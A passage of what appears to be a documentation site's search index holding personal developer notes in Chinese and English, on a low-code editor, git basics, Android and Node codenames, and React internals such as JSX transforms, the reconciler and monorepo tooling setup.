[cmps[selectedIndex + 1], cmps[selectedIndex]]\n  assembly[]\n}\n// \u4e0b\u79fb\nconst downZIndex = () =&gt; {}\n// \u7f6e\u9876\nconst topZIndex = () =&gt; {}\n// \u7f6e\u5e95\nconst bottomZIndex = () =&gt; {}\n</code></pre>"},{"location":"projects/lowcode/#_5","title":"\u5c45\u4e2d\u548c\u8fb9\u6846\u5bf9\u9f50","text":"<p>\u62d6\u62fd\u7ec4\u4ef6\u65f6 \u8ddd\u79bb\u503c\u5c0f\u4e8e<code>showdiff = 12</code>\u65f6\uff0c\u663e\u793a\u5bf9\u9f50\u7ebf\uff0c \u8ddd\u79bb\u503c\u5c0f\u4e8e<code>snapdiff = 3</code>\u65f6\uff0c \u5c31\u81ea\u52a8\u5438\u9644</p> <pre><code>function onCmpDrag(distance, alignLineId, snapCb: () =&gt; void ) {\n  const _distance = Math.abs(distance)\n  const alignLine = document.getElementById(alignLineId)\n  // \u8ddd\u79bb\u503c\u5c0f\u4e8e`showdiff = 12`\u65f6\uff0c\u663e\u793a\u5bf9\u9f50\u7ebf\uff0c\n  if (_distance &lt; showdiff) {\n    alignLine.style.display = true\n  }\n  // \u8ddd\u79bb\u503c\u5c0f\u4e8e`snapdiff = 3`\u65f6\uff0c \u5c31\u81ea\u52a8\u5438\u9644\n  if (_disatance &lt; snapdiff) {\n    snapCb()\n  }\n}\n</code></pre> <pre><code>interface SnapLineProps {\n\n}\n\n\nexport default function SnapLine() {\n\n}\n</code></pre>"},{"location":"projects/lowcode/#_6","title":"\u7ec4\u4ef6\u5bf9\u9f50","text":"<pre><code>if(targetCmp.style.bottom === selectedCmp.style.top) {\n\n}\n</code></pre> <pre><code>const isCmpInView = (cmp:ICmpWithKey) =&gt; {\n  const el = document.getElementById(\"cmp\" + cmp.key)\n\n  const viewHeight = window.innerHeight || document.documentElement.clientHeight\n  const viewWidth = window.innerWidth || document.documentElement.clientWidth\n\n  const {top, left, right, bottom} = el.getBoundingClientRect()\n  return top&gt;=0 &amp;&amp; left &gt;=0 &amp;&amp; right &lt;= viewWidth &amp;&amp; bottom &lt;= wiewHeight\n}\n</code></pre>"},{"location":"projects/lowcode/#_7","title":"\u8865\u5145\u77e5\u8bc6","text":""},{"location":"projects/lowcode/#white-space","title":"white-space","text":"New lines Spaces and tabs Text wrapping End-of-line spaces End-of-line other space separators <code>normal</code> Collapse Collapse Wrap Remove Hang <code>nowrap</code> Collapse Collapse No wrap Remove Hang <code>pre</code> Preserve Preserve No wrap Preserve No wrap <code>pre-wrap</code> Preserve Preserve Wrap Hang Hang <code>pre-line</code> Preserve Collapse Wrap Remove Hang <code>break-spaces</code> Preserve Preserve Wrap Wrap"},{"location":"projects/lowcode/#_8","title":"\u663e\u793a\u7f29\u7565\u56fe\uff0c\u6d77\u62a5\u9875\u9762\u751f\u6210\u53ef\u4e0b\u8f7d\u56fe\u7247","text":"<p><code>Header/index.tsx</code></p> <pre><code>const saveAndDownload = () =&gt; {\n  const {imgSrc} = result.thumbnail\n  const downloable = document.createElement('a')\n  downloable.href = imgSrc\n  downloable.download = result.title + '.png'\n  downloable.style.display = \"none\"\n  document.appendChild(downloable)\n  downloable.click()\n  document.removeChild(downloable)\n}\n</code></pre> <p><code>vite.config.ts</code></p> <pre><code>export default defineConfig(\n  server: {\n    \"proxy\": {\n      \"/api\": \"http://template.xiyuan.dev\",\n      \"/static\": \"http://template.xiyuan.asset\"\n    }\n  }\n)\n</code></pre>"},{"location":"projects/lowcode/#_9","title":"\u52a8\u753b","text":"<pre><code>type Pair = {name: string, value: string | nubmer }\nconst handleStyleChange(\n  _pair: Pair | Array&lt;Pair&gt;\n) {\n  const pair:Array&lt;Pair&gt; = Array.isArray(_pari) ? _pair : [_pair]\n  const newStyle:Style = {}\n  pair.forEach([name,value] =&gt; { newStyle[name} = value })\n}\n\n&lt;Item label=\"\u5faa\u73af\u6b21\u6570\" tip=\"s\"&gt;\n  &lt;input\n  type=\"number\"\n  value={parseInt(style.animationDuration)}\n  onChange={e =&gt; handleStyle(e, {\n    name: \"animationDuration\",\n    value: e.target.value + 's'\n  }}\n  /&gt;\n&lt;/Item&gt;\n</code></pre> <pre><code>interface ICmp {\n\n  groupKey: string,\n  groupCmpsKey: Arrary&lt;string&gt;\n}\n</code></pre>"},{"location":"projects/monitor/","title":"Monitor","text":"<p>graceful degradation, security logging monitoring and alerting\uff0c auditing \u4f18\u96c5\u5931\u8d25\uff0c\u65e5\u5fd7, \u76d1\u63a7\uff0c\u9884\u8b66, \u5ba1\u67e5</p> <p>visual aids for discussion system digrams, flowcharts, sequence diagrams</p>"},{"location":"projects/network_storage/","title":"\u7f51\u7edc\u548c\u5b58\u50a8","text":"<ul> <li>[] JSON\u89e3\u6790&amp;\u6a21\u578b\u8f6c\u6362</li> <li>[] http</li> <li> </li> </ul>"},{"location":"projects/network_storage/#shared_preference","title":"[] shared_preference","text":""},{"location":"projects/string/","title":"String","text":""},{"location":"projects/string/#string-pattern-match","title":"string pattern match","text":""},{"location":"projects/string/#string-encoding","title":"string encoding","text":""},{"location":"projects/string/#string-altering-method","title":"string altering method","text":""},{"location":"projects/symbol/","title":"symbol","text":"<ul> <li>Symbol() \uff1a\u5185\u90e8\u4f1a\u5efa\u7acb\u4e00\u4e2a\u72ec\u7279\u7684 id\uff08unique id\uff09 \uff0c\u4e24\u4e2a\u76f8\u540c key \u7684 Symbol \u662f\u4e0d\u540c\u7684\uff0c\u4e14\u65e0\u6cd5\u900f\u8fc7 Symbol.keyFor() \u627e\u5230\u3002</li> <li>Symbol.for() \uff1a\u4e00\u6837\u90fd\u4f1a\u751f\u6210\u65b0\u7684 Symbol\uff0c\u4f46\u4e24\u4e2a\u76f8\u540c key \u7684 Symbol \u4f1a\u662f\u76f8\u540c\u7684\uff08reused id\uff09\uff0c\u4e14\u53ef\u4ee5\u900f\u8fc7 Symbol.keyFor() \u627e\u5230\u3002</li> <li>Symbol.keyFor() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5df2\u767b\u8bb0\u7684 Symbol \u7c7b\u578b\u503c\u7684 key`</li> </ul> <p>prefix and postfix</p> <p>origin, target</p> <p>bannerId \\u+001 id \u274c</p>"},{"location":"projects/version_control/","title":"\u7248\u672c\u63a7\u5236","text":"<p>code repository</p>"},{"location":"projects/version_control/#git-way-of-thinking","title":"git \"way of thinking\"","text":"<p>startup file strcture <pre><code>.git\nCOPYRIGHT\n</code></pre></p>"},{"location":"projects/version_control/#moving-data-from-left-to-right","title":"moving data from left to right","text":"<p>move data from working area -&gt; stage area git diff git add</p> <p>move data from stage area -&gt; repository git diff --cached git commit</p>"},{"location":"projects/version_control/#moving-data-from-right-to-left","title":"moving data from right to left","text":"<p>delete files add to stage area : <code>git rm --cached</code></p> <pre><code>\u279c cat COPYRIGHT\n@copyright by xiyuan\n\u279c git add COPYRIGHT\n\u279c git status\nChanges to be committed:\n  (use \"git rm --cached &lt;file&gt;...\" to unstage)\n    new file:   COPYRIGHT\n\u279c git rm --cached COPYRIGHT\nrm 'COPYRIGHT'\n\u279c git status\nuntracked files:\n  (use \"git add &lt;file&gt;...\" to include in what will be committed)\n    COPYRIGHT\n</code></pre> <p>delete files add to working are: <code>rm COPYRIGHT</code></p> <p>renaming file <pre><code>\u279c mv README.txt README.md\n\u279c git status\nUntracked files:\n    README.md\n</code></pre></p> <pre><code>\u279c git mv README.text -&gt; README.md\nChanges to be committed:\n    renamed: README.txt -&gt; README.md\n</code></pre>"},{"location":"projects/version_control/#move-branch","title":"move branch","text":"<p><code>git reset --soft</code>: don't copy <code>git reset --mixed</code>: default, copy data from repo -&gt; index <code>git reset --hard</code>: copy data from repo -&gt; index and working area</p> <p><code>git reset --mixed head</code>: unstage change in stage area <code>git reset --hard head</code> : overwrite both working and stage with the cotent of head point commit</p> android release codename Codename Version API level/NDK release Android14 14 API level 34 Android13 13 API level 33 Android12L 12 API level 32 Android12 12 API level 31 Android11 11 API level 30 Android10 10 API level 29 Pie 9 API level 28 Oreo 8.1.0 API level 27 Oreo 8.0.0 API level 26 Nougat 7.1 API level 25 Nougat 7.0 API level 24 Marshmallow 6.0 API level 23 Lollipop 5.1 API level 22 Lollipop 5.0 API level 21 KitKat 4.4 - 4.4.4 API level 19 Jelly Bean 4.3.x API level 18 Jelly Bean 4.2.x API level 17 Jelly Bean 4.1.x API level 16 Ice Cream Sandwich 4.0.3 - 4.0.4 API level 15, NDK 8 Ice Cream Sandwich 4.0.1 - 4.0.2 API level 14, NDK 7 Honeycomb 3.2.x API level 13 Honeycomb 3.1 API level 12, NDK 6 Honeycomb 3.0 API level 11 Gingerbread 2.3.3 - 2.3.7 API level 10 Gingerbread 2.3 - 2.3.2 API level 9, NDK 5 Froyo 2.2.x API level 8, NDK 4 Eclair 2.1 API level 7, NDK 3 Eclair 2.0.1 API level 6 Eclair 2.0 API level 5 Donut 1.6 API level 4, NDK 2 Cupcake 1.5 API level 3, NDK 1 <p>node pick element table theme codename</p> <p>see discussion in github Pick the next ten codenames or something like that</p> node list of codename for LTS releases <p>Argon (4.x 2015) Boron (6.x 2016) Carbon (8.x 2017) Dubnium (10.x 2018) Erbium (12.x 2019) Fermium (14.x 2020) Gallium (16.x 2021) Hydrogen (18.x 2022) Iron (20.x 2023) Jod (22.x 2024) Krypton (24.x 2025) Lithium (26.x 2026) Magnesium (28.x 2027) Neon (30.x 2028) Oxygen (32.x 2029) Platinum (34.x 2030)</p> <p>another interesting codename theme</p> <p>Herbs + Spices</p> <p>Dill Epazote Fennel Garlic Horseradish Italian Seasoning Jalapeno Powder Kaffir Lavendar Marjoram Nutmeg Oregano Parsley Quatre epices Rosemary Sage Thyme Urfa Biber Vadouvan Wasabi Xanthan Gum Yellow Mustard Seed Za'atar</p> <ol> <li> <p>android releases codename\u00a0\u21a9</p> </li> </ol>"},{"location":"projects/yesplaymusic/","title":"Yesplaymusic","text":""},{"location":"projects/yesplaymusic/#project-structure","title":"project structure","text":"<pre><code>---app.config.json\n---project.config.json\n---cloud-functions\n---utils\n---services\n    ---pageapi\n---assets\n---compoents\n---pages\n</code></pre>"},{"location":"projects/yesplaymusic/#client-side-routing","title":"client side routing","text":""},{"location":"projects/yesplaymusic/#reactiverender-data-to-template","title":"reactive:render data to template","text":""},{"location":"projects/yesplaymusic/#event-driven","title":"event-driven","text":"<p>event captcure   event bubble   event object     - target: \u4e8b\u4ef6\u89e6\u53d1\u7684\u6e90\u7ec4\u4ef6     - currentTarget: \u4e8b\u4ef6\u7ed1\u5b9a\u4e86handler\u7684\u7ec4\u4ef6</p>"},{"location":"projects/yesplaymusic/#component-and-plug-in","title":"component and plug-in","text":"<ul> <li>cross page reused componet</li> <li>inside page reused compoent</li> <li>cross project reused component</li> </ul>"},{"location":"projects/yesplaymusic/#_1","title":"\u9879\u76ee\u914d\u7f6e\u548c\u642d\u5efa","text":""},{"location":"projects/yesplaymusic/#_2","title":"Yesplaymusic","text":"<ul> <li>inside page componet <code>pages/page1/components</code></li> <li>cross page componet <code>src/components</code></li> <li>cross project component</li> </ul>"},{"location":"projects/yesplaymusic/#bug-fix","title":"bug fix","text":"<p>\u5c0f\u7a0b\u5e8f\u63d2\u69fd\u5b9e\u73b0</p> <pre><code>header .slot:empty + .default { display: flex}\n</code></pre> <pre><code>isInvoked &amp;&amp; audioContext.stop() // \u975e\u521d\u6b21\u8c03\u7528,\u505c\u6b62\u4e0a\u6b21\u8c03\u7528\u7684\u64ad\u653e\naudioContext.src = ``//\u83b7\u53d6\u64ad\u653e\u6e90\naudioConext.play() //\n</code></pre>"},{"location":"react/","title":"Index","text":"<ul> <li> \u8dd1\u901a\u5b98\u65b9\u6d4b\u8bd5\u7528\u4f8b</li> </ul>"},{"location":"react/assets/","title":"Assets","text":"<p>vector  icons</p> <ul> <li>fontawesome</li> <li>feather</li> <li></li> </ul>"},{"location":"react/component/","title":"Component","text":"Return <p>we can actually return more than just React Elements from a component function. valid value:</p> <ul> <li>A React Element</li> <li><code>false</code>, <code>null</code> , <code>undefined</code> to render nothing</li> <li>An array of any of these</li> <li>Portals</li> </ul> <p>why react exist?</p> <p>using react to build UIs</p> <p>declarative programming is well suit for building UI </p> <p>typical performance issue faced by web developers</p> <p>declarative philosophy of react</p> <p>abstraction layer </p> <p>major feature of react</p> React component exposed API <p>the flow of control</p> <p>run-to-completion nature of the main thread.</p> <p>diffing and patching</p> <p>accept the React component and return a platform-specific result.platform-specific</p> <ul> <li>platform-specific operations (\u5bbf\u4e3b\u73af\u5883API)</li> </ul> <p>asset management (images, SVG files, fonts, etc.)</p>"},{"location":"react/jsx-transpile/","title":"JSX\u8f6c\u6362","text":"<p> <p></p>"},{"location":"react/jsx-transpile/#jsx","title":"JSX \u8f6c\u6362","text":"<p>\u672c\u8282\u8bfe\u4ee3\u7801\u5730\u5740</p> <p>React \u9879\u76ee\u67b6\u6784</p> <ul> <li><code>react</code>\uff08\u5bbf\u4e3b\u73af\u5883\u65e0\u5173\u7684\u516c\u7528\u65b9\u6cd5\uff09</li> <li><code>react-reconciler</code> (\u534f\u8c03\u5668\u7684\u5b9e\u73b0\uff0c\u5bbf\u4e3b\u73af\u5883\u65e0\u5173)</li> <li><code>shared</code> (\u516c\u7528\u8f85\u52a9\u65b9\u6cd5\uff0c\u5bbf\u4e3b\u73af\u5883\u65e0\u5173)</li> </ul> <p>\u672c\u8282\u8bfe\u5c06\u5b9e\u73b0\u7684JSX\u8f6c\u6362\u5c5e\u4e8e<code>react</code>\u5305</p> <p>JSX \u8f6c\u6362\u662f\u4ec0\u4e48</p> <p>jsx \u8f6c\u6362\u6f14\u7ec3\u573a</p> <ul> <li>\u7f16\u8bd1\u65f6</li> <li>\u8fd0\u884c\u65f6:jsx \u6216 React.createElemnt \u7684\u6267\u884c</li> </ul> <p>\u7f16\u8bd1\u65f6\u7531 babel \u7f16\u8bd1\u5b9e\u73b0, \u6211\u4eec\u6765\u5b9e\u73b0\u8fd0\u884c\u65f6, \u6b65\u9aa4\u5206\u4e3a</p> <ol> <li>\u5b9e\u73b0 jsx \u65b9\u6cd5</li> <li>\u5b9e\u73b0\u6253\u5305\u6d41\u7a0b</li> <li>\u5b9e\u73b0\u8c03\u8bd5\u6253\u5305\u7ed3\u679c\u7684\u73af\u5883</li> </ol> \u5b9e\u73b0jsx\u65b9\u6cd5 <p>\u5305\u62ec:</p> <ul> <li><code>jsx</code>\u65b9\u6cd5 (prod \u73af\u5883)</li> <li><code>jsxDev</code>\u65b9\u6cd5 (dev \u73af\u5883)</li> <li><code>React.createElement</code> \u65b9\u6cd5</li> </ul> \u5b9e\u73b0\u6253\u5305\u6d41\u7a0b <p>\u5bf9\u5e94\u4e0a\u8ff0 3 \u4e2a\u65b9\u6cd5,\u6253\u5305\u5bf9\u5e94\u6587\u4ef6</p> <ul> <li>react/jsx-dev-runtime.js (dev \u73af\u5883)</li> <li>react/hsx-runtime.js (prod \u73af\u5883)</li> <li>React</li> </ul> \u8c03\u8bd5\u6253\u5305\u7ed3\u679c <p>[pnpm link \u6587\u6863] (https://pnpm.io/zh/cli/link)</p> <p></p> <p>\u6a21\u62df\u5b9e\u9645\u9879\u76ee\u4e2d\u5f15\u7528 react</p> <p>\u77e5\u8bc6\u8865\u5145</p> @rollup/plugin-commonjs\u63d2\u4ef6\u7684\u4f5c\u7528 <p><code>rollup</code>\u539f\u751f\u652f\u6301<code>ESM</code>\u683c\u5f0f\uff0c \u6240\u4ee5\u5bf9<code>CJS</code>\u683c\u5f0f\u7684\u5305\uff0c\u9700\u8981\u5148\u7528\u63d2\u4ef6\u5c06\u4ed6\u8f6c\u6362\u4e3a<code>ESM</code>\u683c\u5f0f\uff0c</p> \u4e3a\u4ec0\u4e48\u8981\u522b\u5206\u522b\u5b9e\u73b0createElement\u4e0ejsx\u8fd92\u4e2aAPI <p>Pass key separately from props key \u4e3a\u4ec0\u4e48\u5355\u72ec\u4f20\u53c2 before: pass it as part of props now: pass it as separate arguments</p> <pre><code>jsx(type, props, key) {}\n</code></pre> <p>Always pass children as props</p> <p>DEV only transforms</p> <pre><code>jsxDEV(type, props, key, isStaticChildren, source, self){}\n</code></pre>"},{"location":"react/jsx/","title":"jsx","text":"JSX expression <p><code>JSX expression</code>, ues to create <code>ReactElement</code>,</p> <p>which wil be compile to  calling the API, <code>React.creatElement(type, props, ...children)</code></p> <p>we can use <code>JSX expression</code> anywhere we could use any other expression( <code>name</code> \u3001<code>call expression</code> \u3001<code>literal</code> \u3001<code>member experssion</code>)</p> props <p>Any JSX attributes become props(parameters) of the ReactElement. The value of an attribute can be a string, like <code>status=\"pending\"</code>,  or it can be any Javascript expression when wrapped in curly braces, as in <code>onLoad={loadingAsset}</code></p> <p>(which will set the value of the <code>onLoad</code> prop to <code>loadingAsset</code>)</p> children <p>Any children elements should go between the opening tag <code>&lt;View&gt;</code>,  and closing tag <code>&lt;/View&gt;</code>, element  without a children can use a self-closing tag, like<code>&lt;View/&gt;</code>,  as a shorthand</p> interpolation <p>children can generally other elements, but can also be any other kind of expression if wrapped in curly braces <code>{...}</code></p> <pre><code>const hasbeenLoaded = useState(false)\nconst element = (\n    &lt;View&gt;\n    &lt;AppLoading/&gt;\n    {hasbeenLoaded}\n  &lt;/View&gt;\n)\n</code></pre>"},{"location":"react/mount/","title":"\u521d\u63a2mount","text":"\u66f4\u65b0\u6d41\u7a0b <p>\u66f4\u65b0\u7684\u76ee\u7684\uff1a</p> <ul> <li>\u751f\u6210wip fiberNode\u6811</li> <li>\u6807\u8bb0flags</li> </ul> <p>\u66f4\u65b0\u6d41\u7a0b\u7684\u6b65\u9aa4\uff1a</p> <ul> <li>\u9012\uff1a beginWork</li> <li>\u5f52\uff1a completeWork</li> </ul> beginWork <p>\u5bf9\u6bd4B\u7684current fiberNode\u4e0eB\u7684reactElement,\u751f\u6210B\u5bf9\u5e94\u7684wip fiberNode</p> <ul> <li>placement</li> </ul> <pre><code>\u63d2\u5165\uff1a a -&gt; ab \u79fb\u52a8\uff1a abc -&gt; bca\n</code></pre> <ul> <li>childDeltetion</li> </ul> <pre><code>\u5220\u9664 ul&gt;li*3 -&gt; ul&gt;li*1\n</code></pre> <ul> <li>propsUpdate</li> </ul> <pre><code>&lt;img title=\"wip\"/&gt; -&gt; &lt;img title=\"pending\"/&gt;\n</code></pre> <p>\u5b9e\u73b0\u4e0eHost\u76f8\u5173\u8282\u70b9\u7684beginWork</p> <p>\u9996\u5148\uff0c\u4e3a\u5f00\u53d1\u73af\u5883\u589e\u52a0<code>__DEV__</code>\u6807\u8bc6\uff0c\u65b9\u4fbfDev\u5305\u6253\u5370\u66f4\u591a\u4fe1\u606f</p> <pre><code>pnpm i -d -w @rollup/plugin-replace\n</code></pre> <p>HostRoot\u7684beginWork\u5de5\u4f5c\u6d41\u7a0b</p> <ol> <li>\u8ba1\u7b97\u72b6\u6001\u7684\u6700\u65b0\u503c</li> <li>\u521b\u9020\u5b50fiberNode</li> </ol> <p>HostComponent\u7684beginWork\u5de5\u4f5c\u6d41\u7a0b</p> <ol> <li>\u521b\u9020\u5b50fiberNode</li> </ol> <p>HostText\u6ca1\u6709beginWork\u5de5\u4f5c\u6d41\uff08\u56e0\u4e3a\u5b83\u6ca1\u6709\u5b50\u8282\u70b9\uff09</p> beginWork\u7684\u6027\u80fd\u4f18\u5316\u7b56\u7565"},{"location":"react/react-native/","title":"React native","text":"<p> <p></p> everythinng you need to know to build react native <ul> <li> <p>located / find in</p> </li> <li> <p>covered thoroughly </p> </li> <li> <p>Up next </p> </li> <li> <p>features or components you'll be using most in your project provide by React Native framework</p> </li> </ul> core compoennts <p>components that you'll be using most in your project provided by React Native framework</p> view <p><code>view</code>  is a abstraction layer on top of the target platfrom' natvie equivalent</p> <ul> <li>For IOS - <code>UIView</code></li> <li>For Android - <code>android.view</code></li> <li>For Web - <code>div</code></li> </ul> <p>naviagation in react-native</p> <p>handle API access and cache in react native</p> <p>style in react native</p> <p>animation, transtition and interaction in react native</p> <p>ads on applcation (banner ads, video aps)</p> <p>react-friendly IDE</p> <p>battle test best practice</p> vector  icons <ul> <li>fontawesome</li> <li>feather</li> <li></li> </ul> navigation <ul> <li>stack</li> <li>tab</li> <li>drawer</li> <li>modal</li> <li>deep linking</li> </ul> <p> <p></p> Up next <p>Now that you have a project set up, let jump into some of Javascript language feature  we'll be using. If you are familira with each, skip to React to learn more about <code>React</code>. If you're already familiar with <code>React</code> skip to Core component to learn more about the compoents provided by the React native framework</p>"},{"location":"react/reconciler/","title":"\u521d\u63a2reconciler","text":"<p> <p></p>"},{"location":"react/reconciler/#reconciler","title":"\u5b9e\u73b0reconciler\u67b6\u6784","text":"<p>\u4ee3\u7801\u5730\u5740</p> <p><code>reconciler</code>\u662f<code>react</code>h</p> reconciler\u6709\u4ec0\u4e48\u7528? <p>inversion of control:\u5f00\u53d1\u8005\u4e0d\u518d\u76f4\u63a5\u8c03\u7528\u5bbf\u4e3b\u73af\u5883api</p> <p>\u8fc7\u7a0b\u9a71\u52a8:</p> <p></p> <p>\u72b6\u6001\u9a71\u52a8</p> <p></p> reconciler\u64cd\u4f5c\u7684\u6570\u636e\u7ed3\u6784\u662f <p>\u5f53\u524d\u6211\u4eec\u4e86\u89e3\u7684\u8282\u70b9\u7c7b\u578b:</p> <ul> <li>JSX</li> <li>ReactElement</li> <li>FiberNode</li> <li>DOMElement</li> </ul> <p><code>straight forward appoch</code>\u662f\u7528<code>ReactElement</code>,\u4f46ReactElement\u4f5c\u4e3a\u6570\u636e\u7ed3\u6784,\u5b58\u5728\u7684\u95ee\u9898:</p> <ul> <li>\u65e0\u6cd5\u8868\u8fbe\u8282\u70b9\u4e4b\u95f4\u7684\u5173\u7cfb</li> </ul> <p>\u6211\u4eec\u9700\u8981\u7684\u6570\u636e\u7ed3\u6784\u7684\u7279\u70b9\u662f:</p> <ul> <li>\u4ecb\u4e8e<code>ReactElement</code>\u4e0e\u771f\u5b9eUI\u8282\u70b9\u4e4b\u95f4</li> <li>\u80fd\u591f\u8868\u8fbe\u8282\u70b9\u4e4b\u95f4\u7684\u5173\u7cfb</li> <li>\u65b9\u4fbf\u6269\u5c55(\u4e0d\u4ec5\u80fd\u4f5c\u4e3a\u6570\u636e\u5b58\u50a8\u5355\u5143, \u4e5f\u80fd\u4f5c\u4e3a\u5de5\u4f5c\u5355\u5143)</li> </ul> <p><code>FiberNode</code>(\u865a\u62dfDOM\u5728React\u4e2d\u7684\u5b9e\u73b0)</p> <p>\u865a\u62dfDOM\u5728Vue\u4e2d\u7684\u5b9e\u73b0\u662f<code>vnode</code></p> reconciler\u7684\u5de5\u4f5c\u65b9\u5f0f? <p>\u5bf9\u4e8e\u540c\u4e00\u8282\u70b9,\u6bd4\u8f83\u5176<code>ReactElement</code>\u4e0e<code>fiberNode</code>. \u751f\u6210\u5b50<code>fiberNode</code>.\u5e76\u6839\u636e\u6bd4\u8f83\u7684\u7ed3\u679c\u751f\u6210\u4e0d\u540c\u7684\u6807\u8bb0(\u63d2\u5165\u3001\u5220\u9664\u3001\u79fb\u52a8...), \u5bf9\u56e0\u4e0d\u540c<code>\u5bbf\u4e3b\u73af\u5883API\u7684\u6267\u884c</code></p> <p></p> <p>\u5f53\u6240\u6709<code>ReactElement</code>\u6bd4\u8f83\u5b8c\u540e\uff0c\u4f1a\u751f\u6210\u4e00\u68f5<code>fiberNode</code>\u6811\uff0c \u4e00\u5171\u4f1a\u5b58\u5728\u4e24\u68f5<code>fiberNode</code>\u6811\uff1a</p> <ul> <li>current: \u4e0e\u89c6\u56fe\u4e2d\u771f\u5b9eUI\u5bf9\u5e94\u7684<code>fiberNode</code>\u6811</li> <li>workInProgress : \u89e6\u53d1\u66f4\u65b0\u540e\uff0c\u5728<code>reconciler</code>\u4e2d\u8ba1\u7b97\u51fa\u7684<code>fiberNode</code>\u6811 </li> </ul> jsx\u7684\u6d88\u8d39\u987a\u5e8f <p>\u4ee5DFS\uff08\u6df1\u5ea6\u4f18\u5148\u904d\u5386\uff09 \u7684\u987a\u5e8f\u904d\u5386<code>ReactEleement</code>, \u8fd9\u610f\u5473\u7740</p> <ul> <li>\u5982\u679c\u6709\u5b50\u8282\u70b9\uff0c\u904d\u5386\u5b50\u8282\u70b9</li> <li>\u5982\u679c\u6ca1\u6709\u5b50\u8282\u70b9\uff0c \u904d\u5386\u5144\u5f1f\u8282\u70b9 </li> </ul> <p>\u8fd9\u662f\u4e2a\u9012\u5f52\u7684\u8fc7\u7a0b\uff0c \u5b58\u5728\u9012\u3001\u5f52\u4e24\u4e2a\u9636\u6bb5\uff1a</p> <ul> <li>\u9012\uff1a\u5bf9\u5e94beginWork</li> <li>\u5f52\uff1a \u5bf9\u5e94completeWork</li> </ul>"},{"location":"react/setup/","title":"\u642d\u5efa\u5f00\u53d1\u548c\u8c03\u8bd5\u73af\u5883","text":"<p>dev env &amp; debug env set up to develop react app</p> <ul> <li>\u9879\u76ee\u67b6\u6784(monorepo)</li> <li>\u5f00\u53d1\u89c4\u8303(lint\u3001commit\u3001style\u3001pretty)</li> <li>\u7f16\u8bd1\u5de5\u5177(tsc)</li> <li>\u9009\u62e9\u6253\u5305\u5de5\u5177</li> </ul> <p>MonoRepo vs MultiRepo \u8be5\u5982\u4f55\u9009\u62e9</p> <p></p> <ul> <li>`Mono-repo`\u591a\u4e2a\u9879\u76ee\u653e\u5728\u540c\u4e00\u4e2a\u4ed3\u5e93</li> <li>`Multi-repo`\u6bcf\u4e2a\u9879\u76ee\u5bf9\u5e94\u5355\u72ec\u7684\u4e00\u4e2a\u4ed3\u5e93\u6765\u7ba1\u7406</li> </ul> <p>Mono-repo \u6280\u672f\u9009\u578b</p> <p>\u5305\u7ba1\u7406\u5de5\u5177 pnpm feature<code>workspace</code>:</p> <ul> <li>pnpm workspace</li> </ul> <p>First, let's install command line tool <code>pnpm</code> to wrok with <code>monoRepo</code> project</p> <pre><code>npm i -g pnpm\n</code></pre> <p>Now use pnpm to init a new <code>monoRepo</code> project in current folder</p> <pre><code>pnpm init .\n</code></pre> <p>\u4fee\u6539\u521d\u59cb\u5316\u540e\u7684\u9879\u76ee\u914d\u7f6e\u6587\u4ef6<code>package.json</code>\u5982\u4e0b:</p> <pre><code>{\n  \"private\": true, // not publish to npm registery\n  \"module\": \"index.ts\", // ESmodule module loading entry\n  \"type\": \"module\", // Files ending with .js are loaded as ES modules when the nearest parent package.json file contains a top-level field \"type\" with a value of \"module\".\n  \"packageManager\": \"pnpm\",\n  \"desc\": \"react\u516c\u7528\u65b9\u6cd5\"\n}\n</code></pre> <p>\u65b0\u5efa\u914d\u7f6e\u6587\u4ef6<code>pnpm-workspace.yaml</code>,\u6dfb\u52a0\u5982\u4e0b\u914d\u7f6e</p> <pre><code>packages:\n    - \"pakcages/*\"\n</code></pre> <p>\u5f00\u53d1\u89c4\u8303</p> \u4ee3\u7801\u89c4\u8303 <p>\u5b89\u88c5:</p> <pre><code>pnpm i eslint -D -w\n</code></pre> <p>\u521d\u59cb\u5316:</p> <pre><code>npx eslint --lint\n</code></pre> <p>\u5b89\u88c5 ts \u7684\u89c4\u8303\u89c4\u5219\u96c6:</p> <p>stylistic rules</p> <ul> <li> <p>require one space before and after an arrow function's arrow(=&gt;).</p> </li> <li> <p>disallow spaces between array brackets and other tokens</p> </li> <li>object-curly-spacing</li> <li>one-var-declaration-per-line</li> </ul> <pre><code>pnpm i -D -w @typescript-eslint/eslint-plugin\n</code></pre> <p><code>.eslintrc.json</code>\u914d\u7f6e:</p> <pre><code>{\n  \"env\": {\n    \"browser\": true,\n    \"es2021\": true,\n    \"node\": true\n  },\n  // \u6253\u5f00\u6216\u5173\u95ed\u54ea\u6761\u89c4\u5219convention\n  \"extends\": [\n    \"eslint:recommended\",\n    \"plugin:@typescript-eslint/recommended\",\n    \"prettier\",\n    \"plugin:prettier/recommended\"\n  ],\n  // \u89e3\u6790\u6210AST\u914d\u7f6e\n  \"parser\": \"@typescript-eslint/parser\",\n  \"parserOptions\": {\n    \"ecmaVersion\": \"latest\",\n    \"sourceType\": \"module\"\n  },\n  // \u89c4\u5219\u96c6\n  \"plugins\": [\"@typescript-eslint\", \"prettier\"],\n  // \u81ea\u5b9a\u4e49\u6253\u5f00\u6216\u5173\u95ed\u67d0\u6761\u89c4\u5219\n  \"rules\": {\n    \"prettier/prettier\": \"error\",\n    \"no-case-declarations\": \"off\",\n    \"no-constant-condition\": \"off\",\n    \"@typescript-eslint/ban-ts-comment\": \"off\"\n  }\n}\n</code></pre> \u4ee3\u7801\u98ce\u683c <p>\u5b89\u88c5:</p> <pre><code>pnpm i prettier -D -w\n</code></pre> <p>\u65b0\u5efa<code>.prettierrc.json</code>\u914d\u7f6e\u6587\u4ef6, \u6dfb\u52a0\u5982\u4e0b\u914d\u7f6e:</p> <pre><code> {\n  \"printWidth\": 80,\n  \"tabWidth\": 2,\n  \"useTabs\": true,\n  \"singleQuote\": true,\n  \"semi\": true,\n  \"trailingComma\": none,\n  \"bracketSpacing\": true\n }\n</code></pre> <p>\u5c06<code>prettier</code>\u96c6\u6210\u5230<code>eslint</code>\u4e2d, \u5176\u4e2d:</p> <ul> <li>`eslint-config-prettier`: \u8986\u76d6`eslint`\u4e2d\u4e0e`prettier`\u51b2\u7a81\u7684\u89c4\u5219\u914d\u7f6e</li> <li>`eslint-plugin-prettier`: \u7528prettier\u6765\u63a5\u7ba1\u4fee\u590d\u4ee3\u7801`eslint --fix`</li> </ul> <pre><code>pnpm i eslint-config-prettier eslint-plugin-prettier -D -w\n</code></pre> 